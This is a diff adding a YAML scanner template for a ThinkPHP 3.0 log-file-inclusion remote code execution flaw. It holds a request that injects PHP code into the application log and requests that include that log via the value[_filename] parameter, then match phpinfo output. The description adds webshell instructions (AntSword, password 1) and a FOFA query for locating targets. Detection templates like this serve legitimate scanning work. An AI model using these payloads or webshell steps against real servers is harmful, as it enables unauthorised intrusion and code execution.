@@ -1,0 +1,40 @@
+id: thinkphp-30-log-rce
+
+info:
+  name: Thinkphp 3.0 log 远程命令执行漏洞
+  author: daffainfo
+  severity: critical
+  verified: false
+  description: |
+    ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架。该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。
+    蚁剑连接，得到一个webshell，密码为1（日志文件名需改为今天的日期）
+    debug模式关闭：http://x.x.x.x:23707/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/22_04_13.log
+    debug模式开启：http://x.x.x.x:23707/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/22_04_13.log
+    fofa: app="thinkphp"
+  reference:
+    - https://mp.weixin.qq.com/s/yuaJfZwr4ksstsW8nENoNA
+  tags: thinkphp,3,0,log,rce
+  created: 2025/10/27
+
+set:
+  logfilename: shortyear() + "_" + month() + "_" + day() + ".log"
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php?m=--%3E%3C?=phpinfo();?%3E
+    expression: true
+  r1:
+    brute:
+      p:
+        - /index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{{logfilename}}
+        - /index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/{{logfilename}}
+    request:
+      method: GET
+      path: "{{p}}"
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'PHP Extension') && 
+      response.body.bcontains(b'PHP Version') && 
+      r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+expression: r0() && r1()
